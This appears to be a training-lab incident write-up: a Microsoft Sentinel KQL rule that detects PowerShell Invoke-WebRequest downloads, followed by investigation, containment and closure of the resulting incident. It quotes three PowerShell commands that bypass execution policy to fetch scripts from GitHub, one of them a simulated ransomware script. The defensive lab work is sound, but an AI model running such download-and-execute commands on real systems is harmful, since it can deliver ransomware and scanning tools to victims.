# Overview

Sometimes when a bad actor gains access to a system, they attempt to download malicious payloads or tools directly from the internet to expand control or establish persistence. This is often done using legitimate utilities such as PowerShell to blend in with normal administrative activity. By leveraging commands like `Invoke-WebRequest`, an attacker can download scripts from an external server and immediately execute them, bypassing traditional defenses.

This behavior is commonly associated with post-exploitation activity and may enable malware deployment, data exfiltration, reconnaissance, or command-and-control (C2) communication. Detecting this activity is critical to disrupting an attack early in the kill chain.

When processes execute on a VM, logs are forwarded to **Microsoft Defender for Endpoint** under the `DeviceProcessEvents` table. These logs are ingested into the Log Analytics Workspace used by **Microsoft Sentinel** (SIEM). We will define an alert that triggers when PowerShell downloads a remote file from the internet.

---

# Alert Rule

```kql
let TargetHostname = "ktran-vm";
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine has "Invoke-WebRequest"
| order by TimeGenerated
```

## Analytics Rule Settings

- **Name:** Suspicious PowerShell Remote Download Activity  
- **Description:** Detects PowerShell Invoke-WebRequest downloading remote content  
- Enable the Rule  
- MITRE ATT&CK Mapping:
  - T1059.001 – Command and Scripting Interpreter: PowerShell  
  - T1105 – Ingress Tool Transfer  
- Run query every 4 hours  
- Lookup data from last 24 hours  
- Stop running query after alert is generated (24 hours)

### Entity Mappings
- **Account**
  - Identifier: Name  
  - Value: AccountName  
- **Host**
  - Identifier: HostName  
  - Value: DeviceName  
- **Process**
  - Identifier: CommandLine  
  - Value: ProcessCommandLine  

- Automatically create an Incident  
- Group alerts into a single Incident per 24 hours  

---

# Incident

The alert triggered and generated an incident in Microsoft Sentinel.

![incident](/images-sus/incident.png)

The incident was assigned and set to **Active**.

![incident assign](/images-sus/incident-assigned.png)

Investigation revealed three suspicious PowerShell command executions associated with the `ktran-vm` virtual machine.

![incident visual](/images-sus/investigate.png)

## Suspicious Commands Identified

- `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/eicar.ps1 -OutFile C:\programdata\eicar.ps1`
- `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/pwncrypt.ps1 -OutFile C:\programdata\pwncrypt.ps1`
- `powershell.exe -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/joshmadakor1/lognpacific-public/refs/heads/main/cyber-range/entropy-gorilla/portscan.ps1 -OutFile C:\programdata\portscan.ps1`

Each command used `Invoke-WebRequest` to download a script from GitHub.

---

## Script Execution Verification

To determine whether the downloaded scripts were executed:

```kql
let TargetHostname = "ktran-vm";
let ScriptNames = dynamic(["eicar.ps1", "portscan.ps1", "pwncrypt.ps1"]);
DeviceProcessEvents
| where DeviceName == TargetHostname
| where FileName == "powershell.exe"
| where ProcessCommandLine contains "-File" and ProcessCommandLine has_any (ScriptNames)
| order by TimeGenerated
| project TimeGenerated, AccountName, DeviceName, FileName, ProcessCommandLine
| summarize count() by AccountName, DeviceName, FileName, ProcessCommandLine
```

![execution logs](/images-sus/script-logs.png)

Results confirmed the scripts were executed. User interview revealed the activity began after clicking an external link, after which their screen went blank.

The scripts were forwarded to the malware analysis team. Findings:

- **portscan.ps1** – Scans IP ranges for open common ports and logs results  
- **eicar.ps1** – Creates an EICAR test file to validate antivirus detection  
- **pwncrypt.ps1** – Simulates ransomware by encrypting files and generating a ransom note  

---

# Containment, Eradication, and Recovery

- The affected machine was isolated in Microsoft Defender for Endpoint  
- A full anti-malware scan was executed  
- No persistence mechanisms or lateral movement were detected  
- The device was removed from isolation after validation  

---

# Post-Incident Activities

- User completed additional cybersecurity awareness training  
- Organization upgraded training package (KnowBe4)  
- Began implementing policy restricting PowerShell usage for non-essential users  
- Reviewed endpoint monitoring and script execution controls  

---

# Closure

The incident was documented and classified as a **True Positive**. No evidence of persistence, credential theft, or lateral movement was identified.

```
Alert triggered for PowerShell Invoke-WebRequest activity on host ktran-vm, indicating remote script downloads from GitHub. Investigation confirmed three scripts (eicar.ps1, portscan.ps1, pwncrypt.ps1) were downloaded and executed using -ExecutionPolicy Bypass. User interview determined the activity began after clicking an external link. The device was isolated in MDE and a full anti-malware scan was completed with no evidence of persistence or lateral movement. Scripts were analyzed by the malware team and confirmed to simulate testing, scanning, and ransomware behavior. Preventive actions included enhanced user training and implementation of restricted PowerShell usage policies.
```

![Incident Closed](/images-sus/close.png)
